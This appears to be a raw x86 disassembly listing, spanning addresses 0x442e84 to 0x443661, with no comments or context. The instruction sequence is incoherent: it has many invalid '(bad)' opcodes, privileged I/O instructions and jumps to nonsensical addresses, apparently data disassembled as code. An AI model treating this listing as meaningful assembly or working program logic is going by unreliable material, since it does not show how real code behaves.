  442e84:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  442e85:	add    al,0xab
  442e87:	adc    ecx,DWORD PTR [edx]
  442e89:	sti    
  442e8a:	imul   edx,DWORD PTR [ecx],0xffffff90
  442e8d:	mov    ebx,DWORD PTR [eax+0x7139847]
  442e93:	or     DWORD PTR [ebx],ecx
  442e95:	fisttp DWORD PTR [esi+0x11]
  442e9b:	add    BYTE PTR [eax],al
  442e9d:	nop
  442e9e:	mov    ebx,DWORD PTR [eax-0x3a75c386]
  442ea4:	adc    eax,DWORD PTR [ecx]
  442ea6:	pop    ebx
  442ea7:	sti    
  442ea8:	lds    esi,FWORD PTR [esi+0x527c1dbc]
  442eae:	test   al,0x9b
  442eb0:	(bad)  
  442eb1:	in     al,dx
  442eb2:	or     BYTE PTR ds:0x6b12ae00,0xb7
  442eb9:	xchg   BYTE PTR [ebx+0x3983e50d],cl
  442ebf:	inc    eax
  442ec0:	fnsave [esi-0x6e]
  442ec3:	jge    0x442e7c
  442ec5:	sahf   
  442ec6:	mov    ecx,DWORD PTR ds:0xf8b1d17d
  442ecc:	mov    WORD PTR [edi],cs
  442ece:	ds loope 0x442ed4
  442ed1:	nop
  442ed2:	sub    eax,0x64b43832
  442ed7:	outs   dx,BYTE PTR ds:[esi]
  442ed8:	mov    eax,0xb89e36eb
  442edd:	mov    DWORD PTR [ebx],edi
  442edf:	pop    ebp
  442ee0:	add    edx,DWORD PTR [eax-0x4037474e]
  442ee6:	mov    ah,0xf7
  442ee8:	add    edx,DWORD PTR [eax-0x5900ee73]
  442eee:	push   es
  442eef:	cli    
  442ef0:	jl     0x442e83
  442ef2:	mov    dl,0xf7
  442ef4:	add    edx,ecx
  442ef6:	idiv   BYTE PTR [edi+0x6]
  442ef9:	nop
  442efa:	mov    dl,0xf7
  442efc:	mov    edi,DWORD PTR cs:[ebx]
  442eff:	lock add eax,DWORD PTR [eax]
  442f02:	add    BYTE PTR [eax],al
  442f04:	add    BYTE PTR [eax],al
  442f06:	nop
  442f07:	mov    dl,0xb8
  442f09:	enter  0xb77f,0xf7
  442f0d:	add    edx,DWORD PTR [eax-0x6ccc45cd]
  442f13:	leave  
  442f14:	stos   BYTE PTR es:[edi],al
  442f15:	sub    ebx,DWORD PTR [eax+0x683d2335]
  442f1b:	cmp    BYTE PTR [eax+0x5a2bc4e1],0xe0
  442f22:	adc    al,0x6f
  442f24:	cmp    ecx,DWORD PTR [edi+0x5b]
  442f27:	outs   dx,DWORD PTR ds:[esi]
  442f28:	mov    cl,BYTE PTR [esi-0x37931dc5]
  442f2e:	xchg   edi,eax
  442f2f:	sub    esp,DWORD PTR [ecx+0x7f]
  442f32:	mov    eax,ds:0x92d6f7b2
  442f37:	jg     0x442f3a
  442f39:	inc    edx
  442f3a:	sub    al,ch
  442f3c:	cmp    al,0x4
  442f3e:	nop
  442f3f:	mov    dl,0xf7
  442f41:	xchg   BYTE PTR [esi],bl
  442f43:	lods   al,BYTE PTR ds:[esi]
  442f44:	imul   ebx,ecx,0x190e2b71
  442f4a:	cmp    DWORD PTR [edi-0x14],ebp
  442f4d:	(bad)  
  442f4f:	mov    ds:0x11502c97,eax
  442f54:	sbb    BYTE PTR [edi+0x6c],dh
  442f57:	mov    eax,ds:0xe214e90e
  442f5c:	push   ss
  442f5d:	arpl   WORD PTR [edx],cx
  442f5f:	dec    eax
  442f60:	add    cl,ch
  442f62:	xchg   ebx,eax
  442f63:	sub    dl,BYTE PTR [edx]
  442f65:	fcom   DWORD PTR [edx+0x6302dc]
  442f6b:	add    BYTE PTR [eax],al
  442f6d:	add    BYTE PTR [eax],al
  442f6f:	sub    cl,BYTE PTR [ecx+0x0]
  442f72:	jmp    0xfdac650a
  442f77:	add    al,0xea
  442f79:	push   ss
  442f7a:	jb     0x442f53
  442f7c:	jnp    0x442f14
  442f7e:	std    
  442f7f:	xor    BYTE PTR ds:0xb27a4d80,0xe
  442f86:	call   0xd9e3d33c
  442f8b:	jge    0x443002
  442f8d:	jo     0x442f29
  442f8f:	mov    ah,0xfe
  442f91:	int3   
  442f92:	je     0x442f9f
  442f94:	and    DWORD PTR [edx+0x70b293ff],ebp
  442f9a:	jo     0x442fb6
  442f9c:	inc    edi
  442f9d:	add    cl,ch
  442f9f:	xchg   ebx,eax
  442fa0:	xchg   ebp,eax
  442fa1:	std    
  442fa2:	mov    ah,0x5f
  442fa5:	jo     0x442f97
  442fa7:	or     DWORD PTR [edi+0x0],eax
  442faa:	jmp    0xed142d42
  442faf:	sbb    ch,BYTE PTR [ecx]
  442fb1:	stos   BYTE PTR es:[edi],al
  442fb2:	xlat   BYTE PTR ds:[ebx]
  442fb3:	xchg   ebx,eax
  442fb4:	mov    dl,0x95
  442fb6:	lods   al,BYTE PTR ds:[esi]
  442fb7:	xchg   DWORD PTR ds:0xb28a5d98,esi
  442fbd:	push   cs
  442fbe:	mov    eax,ds:0x8f15880c
  442fc3:	cmp    DWORD PTR [ecx],edx
  442fc5:	xchg   esi,eax
  442fc6:	add    BYTE PTR [ecx+0x4c],bh
  442fc9:	(bad)  
  442fcb:	and    BYTE PTR [ebp+edi*8-0x78],0x34
  442fd0:	mov    edi,0x96f
  442fd5:	add    BYTE PTR [eax],al
  442fd7:	add    BYTE PTR [edi-0x2],ah
  442fda:	(bad)  
  442fdb:	(bad)  
  442fdc:	jmp    0x634c6f0e
  442fe1:	sub    DWORD PTR [ecx-0x694d06ea],esp
  442fe7:	add    al,0xd8
  442fe9:	mov    bl,0x44
  442feb:	adc    al,0x63
  442fed:	sbb    DWORD PTR [eax-0x6c4d46ea],esp
  442ff3:	jle    0x442fda
  442ff5:	sub    eax,0x78320857
  442ffa:	in     eax,0x88
  442ffc:	mov    ch,0xa1
  442ffe:	xchg   ebx,eax
  442fff:	xchg   esi,eax
  443000:	dec    ebp
  443001:	cdq    
  443002:	push   cs
  443003:	add    BYTE PTR [eax-0x664f0270],bh
  443009:	mov    ebx,ss
  44300b:	data16 cli 
  44300d:	retf   0xc26a
  443010:	add    al,0x29
  443012:	jg     0x442fd0
  443014:	addr16 mov dl,0xe
  443017:	lock sub sp,WORD PTR [ecx-0xc4d96ea]
  44301f:	adc    edx,DWORD PTR [edi-0x19]
  443022:	leave  
  443023:	data16 jo 0x443052
  443026:	mov    eax,ds:0x6bb26916
  44302b:	shl    DWORD PTR [ecx+ebp*1-0x69],0xbc
  443030:	addr16 mov dl,0xe
  443033:	mov    esi,esp
  443035:	mov    eax,ds:0x9bad8e93
  44303a:	push   cs
  44303b:	add    BYTE PTR [eax],al
  44303d:	add    BYTE PTR [eax],al
  44303f:	add    BYTE PTR [eax],al
  443041:	stos   BYTE PTR es:[edi],al
  443042:	icebp  
  443043:	in     eax,0x83
  443045:	jo     0x442ff4
  443047:	fs push esi
  443049:	nop
  44304a:	sub    eax,0xb8b6cf9a
  44304f:	xor    eax,DWORD PTR [esi+eax*8+0xc42945f]
  443056:	ss adc al,0x92
  443059:	dec    eax
  44305a:	pop    esi
  44305b:	or     eax,0x15260b00
  443060:	xchg   BYTE PTR [esi],cl
  443062:	push   esp
  443063:	add    BYTE PTR [eax],al
  443065:	nop
  443066:	add    edx,DWORD PTR [edi]
  443068:	setno  ch
  44306b:	push   es
  44306c:	xchg   BYTE PTR [esi],al
  44306e:	and    eax,DWORD PTR [eax]
  443070:	add    BYTE PTR [eax+0x1b13a900],dl
  443076:	into   
  443077:	sbb    al,BYTE PTR [ebp+0x139a474d]
  44307d:	(bad)  
  44307e:	adc    BYTE PTR [ecx+0xd8b9ebb],al
  443084:	dec    DWORD PTR [ebp-0x79]
  443087:	bound  ecx,QWORD PTR [edi]
  443089:	jp     0x4430dc
  44308b:	mov    al,0xcc
  44308d:	test   al,0x8
  44308f:	dec    ebp
  443090:	repz or esi,ebx
  443093:	mov    ss,WORD PTR [ecx]
  443095:	nop
  443096:	mov    esi,DWORD PTR [ebx+0xc30e86]
  44309c:	add    BYTE PTR [eax+0x6361fd30],dl
  4430a2:	jmp    0x443054
  4430a4:	push   es
  4430a5:	add    BYTE PTR [eax],al
  4430a7:	add    BYTE PTR [eax],al
  4430a9:	add    BYTE PTR [esi],dl
  4430ab:	push   ebx
  4430ac:	add    BYTE PTR [eax],al
  4430ae:	nop
  4430af:	or     BYTE PTR [ebx+eax*1+0x9],dl
  4430b3:	fisttp QWORD PTR [esi-0x23746fef]
  4430b9:	clc    
  4430ba:	mov    DWORD PTR [esi],edi
  4430bc:	std    
  4430bd:	or     BYTE PTR [esi],dl
  4430bf:	in     eax,0x12
  4430c1:	add    BYTE PTR [eax-0x614466f0],dl
  4430c7:	mov    dl,0xf7
  4430c9:	add    ebp,DWORD PTR [ebp-0x4e420585]
  4430cf:	lods   eax,DWORD PTR ds:[esi]
  4430d0:	dec    ecx
  4430d1:	xchg   edi,eax
  4430d2:	retf   
  4430d3:	shl    DWORD PTR [edi+0x7b458903],1
  4430d9:	xchg   esi,eax
  4430da:	mov    DWORD PTR [eax+0x297203f7],ebp
  4430e0:	pop    es
  4430e1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4430e2:	int3   
  4430e3:	(bad)  
  4430e4:	ins    BYTE PTR es:[edi],dx
  4430e5:	into   
  4430e6:	mov    ds:0x2795df14,eax
  4430eb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4430ec:	test   DWORD PTR [ebx],0x7b614499
  4430f2:	xor    DWORD PTR [edx-0x55be7509],0x7d9f1f5f
  4430fc:	xor    DWORD PTR [eax],ebx
  4430fe:	cdq    
  4430ff:	inc    esp
  443100:	inc    ecx
  443101:	jl     0x4430a4
  443103:	mov    dl,0xf7
  443105:	mov    cl,BYTE PTR [ecx-0x5a]
  443108:	pop    esp
  443109:	aad    0x97
  44310b:	sub    ch,bl
  44310d:	adc    al,0x0
  44310f:	add    BYTE PTR [eax],al
  443111:	add    BYTE PTR [eax],al
  443113:	or     eax,0x90154324
  443118:	mov    dl,0x46
  44311a:	adc    ebp,DWORD PTR [esi+0x68]
  44311d:	sbb    DWORD PTR [ebx+0x77],edx
  443120:	cmp    dh,dh
  443122:	add    edx,DWORD PTR [eax-0x5c22094e]
  443128:	das    
  443129:	mov    ch,0x32
  44312b:	icebp  
  44312c:	sub    DWORD PTR [ecx+0x7b],edi
  44312f:	xor    DWORD PTR [edx+0x3f018cf7],0x879003e9
  443139:	adc    eax,0xa334220f
  44313e:	loop   0x4430cf
  443140:	mov    dl,0xd1
  443142:	mov    ah,BYTE PTR [ebx]
  443144:	xor    eax,0xb289b70e
  443149:	push   cs
  44314a:	(bad)  
  44314b:	loop   0x4431aa
  44314d:	jo     0x44313f
  44314f:	add    eax,0x93e90044
  443154:	std    
  443155:	iret   
  443156:	jmp    0xb293:0xf7aa2a0c
  44315d:	or     eax,0xfef90a02
  443162:	in     eax,dx
  443163:	pop    ss
  443164:	fsubp  st(1),st
  443166:	idiv   BYTE PTR [ebp-0x3b1ea4ca]
  44316c:	sub    BYTE PTR [eax+0xeb2947d],al
  443172:	jb     0x4431c2
  443174:	xchg   ebx,eax
  443175:	pop    ebx
  443176:	rol    DWORD PTR [eax],1
  443178:	add    BYTE PTR [eax],al
  44317a:	add    BYTE PTR [eax],al
  44317c:	popf   
  44317d:	jp     0x443114
  44317f:	sbb    al,0x80
  443181:	repz fwait
  443183:	pop    edi
  443184:	sbb    al,0xb5
  443186:	push   cs
  443187:	jmp    0xf63aa3a4
  44318c:	jnp    0x443208
  44318e:	jmp    0xf37b0aa1
  443193:	inc    esp
  443194:	push   ecx
  443195:	fisubr DWORD PTR [di+0x6740]
  44319a:	fidivr DWORD PTR [ecx+ecx*1]
  44319d:	mov    BYTE PTR [ebp-0x6a128383],cl
  4431a3:	and    al,0x9c
  4431a5:	int    0xd7
  4431a7:	pop    ss
  4431a8:	pop    ebp
  4431a9:	les    edx,FWORD PTR [esi+0xeb2a649]
  4431af:	fimul  WORD PTR [edi]
  4431b1:	inc    esi
  4431b2:	push   cs
  4431b3:	jmp    0x6c55c74b
  4431b8:	cmp    bh,cl
  4431ba:	push   cs
  4431bb:	bound  ecx,QWORD PTR [edi+0x7f]
  4431be:	xchg   ebp,eax
  4431bf:	jns    0x4431a9
  4431c1:	mov    eax,ds:0xae39000e
  4431c6:	lahf   
  4431c7:	adc    al,0x3
  4431c9:	sub    bh,BYTE PTR [ecx+0xeaf5f98]
  4431cf:	movsx  edi,WORD PTR [edx+0x38]
  4431d3:	inc    ecx
  4431d4:	mov    al,ds:0xa18bdd6b
  4431d9:	xor    bh,bh
  4431db:	jmp    FWORD PTR [ecx]
  4431dd:	sub    BYTE PTR [esp+edi*8],bh
  4431e0:	add    BYTE PTR [eax],al
  4431e2:	add    BYTE PTR [eax],al
  4431e4:	add    BYTE PTR [eax+eiz*8-0x50027aea],ch
  4431eb:	push   cs
  4431ec:	add    dh,dh
  4431ee:	add    eax,0xf8ebb366
  4431f3:	sbb    DWORD PTR [eax],eax
  4431f5:	jmp    0xb31b65a8
  4431fa:	call   0x63a8666
  4431ff:	push   ds
  443200:	mov    bl,0x4f
  443202:	sub    DWORD PTR [edi-0x6d2ee59a],edi
  443208:	dec    eax
  443209:	rcl    DWORD PTR [eax+edx*1-0x70],0x11
  44320e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  44320f:	push   cs
  443210:	add    BYTE PTR [esi-0x20477dfc],dh
  443216:	scas   al,BYTE PTR es:[edi]
  443217:	push   cs
  443218:	mov    ebp,DWORD PTR [ecx-0x66]
  44321b:	xchg   esi,eax
  44321c:	sbb    al,0xa8
  44321e:	mov    ebp,0x4b61429
  443223:	cmp    BYTE PTR [ecx-0x74f15161],0xc1
  44322a:	call   0x1105:0x2e815093
  443231:	repnz and eax,0xb66916a5
  443237:	out    0x40,eax
  443239:	ins    DWORD PTR es:[edi],dx
  44323a:	sub    eax,DWORD PTR [eax+ecx*1+0x8]
  44323e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  44323f:	xor    dl,cl
  443241:	nop
  443242:	imul   edi,DWORD PTR [esi],0xe71805e9
  443248:	out    dx,eax
  443249:	add    BYTE PTR [eax],al
  44324b:	add    BYTE PTR [eax],al
  44324d:	add    BYTE PTR [esi-0x6148a1fe],dh
  443253:	mov    ecx,DWORD PTR ds:0x9669a0e5
  443259:	adc    eax,DWORD PTR [ebx]
  44325b:	jb     0x44329b
  44325d:	fnsave [esi+0x7eb77d82]
  443263:	mov    ecx,DWORD PTR ds:0x96134efd
  443269:	mov    ebx,0x850d8b7e
  44326e:	pop    ebp
  44326f:	ja     0x443252
  443271:	xchg   DWORD PTR [eax],esi
  443273:	bound  ecx,QWORD PTR ds:0xd70d8f00
  443279:	clc    
  44327a:	test   DWORD PTR [eax-0x71d44eeb],0x4e7ffe9
  443284:	fwait
  443285:	mov    ebx,0xb60d8b86
  44328a:	or     BYTE PTR [ebx+0x187b000d],0xe9
  443291:	lds    edx,FWORD PTR [edi-0x4002adf7]
  443297:	mov    edx,DWORD PTR [ecx+esi*4]
  44329a:	add    ecx,DWORD PTR [ecx+ebp*8-0x66565001]
  4432a1:	shr    DWORD PTR [esi],1
  4432a3:	cmp    al,0x30
  4432a5:	test   BYTE PTR [eax-0x6d],cl
  4432a8:	scas   eax,DWORD PTR es:[edi]
  4432a9:	push   es
  4432aa:	add    ah,ah
  4432ac:	cld    
  4432ad:	call   DWORD PTR [eax+0x975f80]
  4432b3:	add    BYTE PTR [eax],al
  4432b5:	add    BYTE PTR [eax],al
  4432b7:	dec    eax
  4432b8:	popa   
  4432b9:	or     eax,0xfe9b0b00
  4432be:	xchg   DWORD PTR [edx+ebx*2-0x4d7bc0dc],edx
  4432c5:	loopne 0x443338
  4432c7:	(bad)  
  4432c8:	cmp    ah,cl
  4432ca:	add    edx,DWORD PTR [eax+0xd0faf2d]
  4432d0:	loop   0x4432c1
  4432d2:	mov    ebp,DWORD PTR [ebx+0xb945ca3]
  4432d8:	mov    al,ds:0xf23903f7
  4432dd:	retf   
  4432de:	je     0x443267
  4432e0:	int3   
  4432e1:	sub    eax,0x62885ca2
  4432e6:	enter  0x825d,0xa8
  4432ea:	mov    WORD PTR [edi],ss
  4432ec:	ss jmp 0x6f54c2f5
  4432f2:	je     0x44333b
  4432f4:	mov    al,ds:0xdd6a03f7
  4432f9:	pop    esp
  4432fa:	and    DWORD PTR [edx+0x75],ebx
  4432fd:	lock jno 0x443339
  443300:	ror    ah,cl
  443302:	ret    
  443303:	out    dx,eax
  443304:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  443305:	mov    BYTE PTR [edi+0x3f3b01c],cl
  44330b:	nop
  44330c:	cmp    eax,0xb29003e7
  443311:	or     al,0x5e
  443313:	push   ss
  443314:	(bad)  
  443316:	mov    fs,WORD PTR [edx-0x56]
  443319:	or     al,0x4f
  44331b:	add    BYTE PTR [eax],al
  44331d:	add    BYTE PTR [eax],al
  44331f:	add    BYTE PTR [ecx],bh
  443321:	adc    esi,ecx
  443323:	jb     0x443348
  443325:	cmp    al,0xf3
  443327:	jmp    FWORD PTR [edi-0x482fa188]
  44332d:	shld   DWORD PTR ds:0xa1efea14,esp,cl
  443334:	mov    fs,WORD PTR [edx]
  443336:	aas    
  443337:	adc    DWORD PTR [eax+0x1f71e0b2],edx
  44333d:	cmp    eax,ecx
  44333f:	add    edx,DWORD PTR [eax-0x5fe6f1d5]
  443345:	sub    cl,BYTE PTR [edx]
  443347:	fsubr  DWORD PTR [edx-0x1e09fd49]
  44334d:	pop    ds
  44334e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  44334f:	not    DWORD PTR [ebx-0x785e6a4e]
  443355:	sub    eax,0x9c1be13e
  44335a:	push   DWORD PTR [ecx+0x23]
  44335d:	cmp    al,0x0
  44335f:	jmp    0x398f60f7
  443364:	jp     0x44331d
  443366:	add    bh,BYTE PTR [eax-0x7d]
  443369:	rcl    ah,1
  44336b:	(bad)  
  44336c:	mov    esi,0x5bac958e
  443371:	sub    al,0x42
  443373:	jecxz  0x4433d8
  443375:	xor    BYTE PTR [esi+0x4d],bh
  443378:	mov    eax,ds:0x148f0eb2
  44337d:	and    BYTE PTR [esi-0xa4d6c29],ah
  443383:	rol    BYTE PTR [eax],cl
  443385:	add    BYTE PTR [eax],al
  443387:	add    BYTE PTR [eax],al
  443389:	xor    DWORD PTR [edi],ebp
  44338b:	xor    BYTE PTR [ebx],0xef
  44338e:	mov    bl,0xe
  443390:	jmp    0x48309ac6
  443395:	mov    esp,DWORD PTR [edx]
  443397:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  443398:	call   DWORD PTR [ebx-0x73e3f24e]
  44339e:	xor    BYTE PTR [esi+0xeb2a285],dl
  4433a4:	jb     0x44333e
  4433a6:	cmp    eax,esi
  4433a8:	or     ecx,esp
  4433aa:	ja     0x443340
  4433ac:	adc    al,0x68
  4433ae:	xor    BYTE PTR [ebx-0x67],cl
  4433b1:	daa    
  4433b2:	pop    esi
  4433b3:	bound  esp,QWORD PTR [ebx]
  4433b5:	lods   eax,DWORD PTR ds:[esi]
  4433b6:	ret    
  4433b7:	stos   DWORD PTR es:[edi],eax
  4433b8:	leave  
  4433b9:	scas   eax,DWORD PTR es:[edi]
  4433ba:	mov    bh,0xe
  4433bc:	bound  ebx,QWORD PTR [ebx+edi*1]
  4433bf:	add    BYTE PTR [eax],al
  4433c1:	jns    0x443376
  4433c3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4433c4:	adc    BYTE PTR [ecx-0x4d],ch
  4433c7:	push   cs
  4433c8:	sub    eax,DWORD PTR [edx]
  4433ca:	jbe    0x4433a2
  4433cc:	jle    0x443357
  4433ce:	push   esp
  4433cf:	xchg   edx,eax
  4433d0:	(bad)  
  4433d1:	push   edi
  4433d2:	fsubp  st(6),st
  4433d4:	mov    esp,DWORD PTR [ecx]
  4433d6:	stos   DWORD PTR es:[edi],eax
  4433d7:	ins    BYTE PTR es:[edi],dx
  4433d8:	or     DWORD PTR [ecx],eax
  4433da:	idiv   bh
  4433dc:	(bad)  
  4433dd:	cmp    DWORD PTR [edx-0x5bee6764],ebp
  4433e3:	push   cs
  4433e4:	add    dl,al
  4433e6:	ss std 
  4433e8:	xchg   DWORD PTR [ebp+0x7c],ebx
  4433eb:	out    0x40,al
  4433ed:	add    BYTE PTR [eax],al
  4433ef:	add    BYTE PTR [eax],al
  4433f1:	add    BYTE PTR [ebp-0x56],al
  4433f4:	pushf  
  4433f5:	cwde   
  4433f6:	mov    al,0xa4
  4433f8:	push   cs
  4433f9:	add    BYTE PTR [edx+0x18b1166],ah
  4433ff:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  443400:	xchg   esi,eax
  443401:	sbb    al,0xee
  443403:	and    eax,0xb2e7bc81
  443408:	push   cs
  443409:	jmp    FWORD PTR [ecx]
  44340b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  44340c:	mov    ecx,0x6fe5d310
  443411:	shr    edi,cl
  443413:	and    eax,0x6f5cf054
  443418:	adc    dh,al
  44341a:	push   edi
  44341b:	sub    edi,DWORD PTR [ecx+0xeb2d7b8]
  443421:	jmp    0x443410
  443423:	push   eax
  443424:	(bad)  
  443426:	push   edi
  443427:	stos   DWORD PTR es:[edi],eax
  443428:	sahf   
  443429:	mov    eax,0x30eb2e7
  44342e:	repnz sub edx,DWORD PTR [ecx+0xeb2c7bc]
  443435:	dec    edx
  443436:	and    BYTE PTR [eax-0x1b],ch
  443439:	xor    ebx,0x90ffe9b2
  44343f:	mov    DWORD PTR [edx+0x63dd9f06],esp
  443445:	pop    ds
  443446:	mov    ecx,0x8ce512cb
  44344b:	add    BYTE PTR [esi+edi*4+0x69],bl
  44344f:	test   DWORD PTR [esi],edx
  443451:	mov    dl,0x21
  443453:	ins    BYTE PTR es:[edi],dx
  443454:	sti    
  443455:	aas    
  443456:	add    BYTE PTR [eax],al
  443458:	add    BYTE PTR [eax],al
  44345a:	add    BYTE PTR [eax-0x70f42f00],dl
  443460:	sbb    al,0xa1
  443462:	scas   al,BYTE PTR es:[edi]
  443463:	xchg   edx,eax
  443464:	adc    BYTE PTR [esi+0xd8ba6bb],dl
  44346a:	mov    ch,0xa0
  44346c:	mov    ecx,DWORD PTR ds:0x94946b00
  443472:	jp     0x4434b4
  443474:	sbb    DWORD PTR [edx+0x79],0xbd910b0
  44347b:	xchg   edi,eax
  44347c:	aam    0xe1
  44347e:	lods   eax,DWORD PTR ds:[esi]
  44347f:	mov    dh,0x0
  443481:	aas    
  443482:	popa   
  443483:	inc    ebx
  443484:	stos   BYTE PTR es:[edi],al
  443485:	call   0x4890:0x142d9847
  44348c:	push   esi
  44348d:	or     eax,0x85bd8f00
  443492:	mov    bh,0x9e
  443494:	mov    ecx,DWORD PTR ds:0x955f4085
  44349a:	sbb    eax,DWORD PTR [ecx+0xb13d28c]
  4434a0:	(bad)  
  4434a1:	dec    BYTE PTR [eax]
  4434a3:	push   ds
  4434a4:	add    al,0x6c
  4434a6:	adc    DWORD PTR [eax-0x67b06b75],edx
  4434ac:	add    eax,DWORD PTR [edi]
  4434ae:	ud2    
  4434b0:	fsub   QWORD PTR [esi+0x11]
  4434b3:	nop
  4434b4:	mov    esp,DWORD PTR [eax]
  4434b6:	aas    
  4434b7:	test   dl,bh
  4434b9:	add    ah,BYTE PTR [esi]
  4434bb:	fidiv  DWORD PTR [edx+0x5319]
  4434c1:	add    BYTE PTR [eax],al
  4434c3:	add    BYTE PTR [eax+0xa343a29],ch
  4434c9:	fucomip st,st(5)
  4434cb:	xor    edx,DWORD PTR [esi]
  4434cd:	and    bl,BYTE PTR [ebx+0xe]
  4434d0:	nop
  4434d1:	mov    dl,0x5c
  4434d3:	sar    DWORD PTR [ebx+0xc],1
  4434d6:	pop    edi
  4434d7:	jl     0x443518
  4434d9:	pushf  
  4434da:	test   DWORD PTR [ebx],0xd96c9b75
  4434e0:	fwait
  4434e1:	or     al,0x5d
  4434e3:	sbb    BYTE PTR ds:0xf123250c,ch
  4434e9:	stos   DWORD PTR es:[edi],eax
  4434ea:	pop    edi
  4434eb:	jl     0x44348e
  4434ed:	mov    dl,0xf7
  4434ef:	add    bl,BYTE PTR [ecx+0x2b]
  4434f2:	pop    edi
  4434f3:	js     0x443496
  4434f5:	mov    dl,0xf7
  4434f7:	mov    bh,BYTE PTR [ebx+0x3f]
  4434fa:	xlat   BYTE PTR ds:[ebx]
  4434fb:	loop   0x44356c
  4434fd:	mov    dl,0x6c
  4434ff:	(bad)  [edi+0x1407302f]
  443505:	sub    eax,0xc918370a
  44350a:	jmp    0x44357c
  44350c:	daa    
  44350d:	(bad)  
  44350e:	mov    bh,0x3
  443510:	or     eax,0x900e532a
  443515:	mov    dl,0x29
  443517:	adc    al,0x90
  443519:	mov    dl,0xf7
  44351b:	jmp    0xdb1a:0x709b8e0
  443522:	repnz fmul DWORD PTR ss:[ebx]
  443526:	pop    ebp
  443527:	xor    DWORD PTR [eax],eax
  443529:	add    BYTE PTR [eax],al
  44352b:	add    BYTE PTR [eax],al
  44352d:	jno    0x443590
  44352f:	(bad)  [edx+0xd51aa57]
  443535:	add    BYTE PTR [edx],bh
  443537:	leave  
  443538:	add    edx,DWORD PTR [eax-0x649e5b]
  44353e:	fwait
  44353f:	push   cs
  443540:	jmp    0xd5a264d8
  443545:	sbb    ebx,DWORD PTR [ecx-0x5f2c59e1]
  44354b:	sbb    DWORD PTR [edi-0x5],edx
  44354e:	cmp    eax,DWORD PTR [eax]
  443550:	jmp    0xf5a262e8
  443555:	sbb    ch,ah
  443557:	push   ss
  443558:	jno    0x443501
  44355a:	test   al,0x95
  44355c:	popa   
  44355d:	jmp    DWORD PTR [ecx-0x4c5916f2]
  443563:	add    bh,BYTE PTR [eax]
  443565:	or     esp,0xffffffd5
  443568:	iret   
  443569:	ret    0x708d
  44356c:	jo     0x443571
  44356e:	cmp    al,0x0
  443570:	jmp    0x12865d08
  443575:	jl     0x4435a5
  443577:	dec    ebx
  443578:	icebp  
  443579:	or     al,0x24
  44357b:	stos   BYTE PTR es:[edi],al
  44357c:	xlat   BYTE PTR ds:[ebx]
  44357d:	xchg   ebx,eax
  44357e:	mov    dl,0xf7
  443580:	fld    TBYTE PTR [eax+0x7a]
  443583:	jmp    0xe6b504f
  443588:	in     eax,dx
  443589:	xchg   ebx,eax
  44358a:	mov    dl,0x70
  44358c:	cmp    dh,BYTE PTR [ecx+0x11]
  44358f:	sbb    BYTE PTR [ecx+0x0],bh
  443592:	add    BYTE PTR [eax],al
  443594:	add    BYTE PTR [eax],al
  443596:	mov    esp,DWORD PTR [ecx+0x6992e90e]
  44359c:	dec    ecx
  44359d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  44359e:	or     al,0x2c
  4435a0:	stos   BYTE PTR es:[edi],al
  4435a1:	xlat   BYTE PTR ds:[ebx]
  4435a2:	xchg   ebx,eax
  4435a3:	mov    dl,0x45
  4435a5:	bound  esi,QWORD PTR [eax+0x4f1dcdd8]
  4435ab:	fidiv  DWORD PTR [di+0x6748]
  4435b0:	fisubr DWORD PTR [ebp-0x6c2598b8]
  4435b6:	add    eax,0xc1dae934
  4435bb:	xor    ebx,DWORD PTR [ebx-0x16ddb900]
  4435c1:	jmp    FWORD PTR [ecx-0x10ffafd4]
  4435c7:	lock call 0x6a59e540
  4435cd:	cmp    DWORD PTR [ecx+0x2a404f44],ebp
  4435d3:	out    dx,eax
  4435d4:	or     eax,0xe13113d1
  4435d9:	pop    ds
  4435da:	xchg   edi,eax
  4435db:	enter  0x836f,0xd7
  4435df:	imul   cl
  4435e1:	jmp    FWORD PTR [ecx-0x51]
  4435e4:	pop    ebp
  4435e5:	xor    al,0x9f
  4435e7:	xor    DWORD PTR [edi+0xeaf79bc],esp
  4435ed:	add    BYTE PTR [ecx+ecx*4],bh
  4435f0:	outs   dx,DWORD PTR ds:[esi]
  4435f1:	xor    edi,0xffffffe5
  4435f4:	jmp    0x5df36ff8
  4435f9:	and    BYTE PTR [eax],al
  4435fb:	add    BYTE PTR [eax],al
  4435fd:	add    BYTE PTR [eax],al
  4435ff:	and    DWORD PTR [esi+0x2c29ffe9],ecx
  443605:	xchg   edi,eax
  443606:	adc    al,0x28
  443608:	scas   eax,DWORD PTR es:[edi]
  443609:	push   cs
  44360a:	nop
  44360b:	pop    edi
  44360c:	xor    ah,BYTE PTR [eax]
  44360e:	add    ah,bl
  443610:	lods   al,BYTE PTR ds:[esi]
  443611:	dec    esi
  443612:	sub    DWORD PTR [eax-0x4e],0x25
  443616:	add    BYTE PTR [eax],ch
  443618:	scas   eax,DWORD PTR es:[edi]
  443619:	push   cs
  44361a:	jl     0x4435b2
  44361c:	sub    DWORD PTR [ecx+0xeaf61c3],0xd5f1e900
  443626:	int3   
  443627:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  443628:	jmp    0x8b3f:0xef2accd5
  44362f:	call   0xe2462565
  443634:	mov    ah,0x53
  443636:	rol    eax,1
  443638:	mov    cl,0xce
  44363a:	test   DWORD PTR [eax-0x1e105dc9],edx
  443640:	jo     0x443605
  443642:	mov    esp,0xcb513ccc
  443647:	les    eax,FWORD PTR [ecx+edx*2-0x35]
  44364b:	fmul   QWORD PTR [edi]
  44364d:	xchg   esi,eax
  44364e:	mov    ebx,0x4d0d897e
  443653:	adc    edx,DWORD PTR [edx-0x3]
  443656:	jb     0x4436b7
  443658:	test   BYTE PTR [ebx-0x69],bh
  44365b:	dec    eax
  44365c:	jb     0x44366b
  44365e:	add    BYTE PTR [ebx],bl
  443660:	lods   al,BYTE PTR ds:[esi]
  443661:	inc    BYTE PTR [eax+eax*1+0x0]
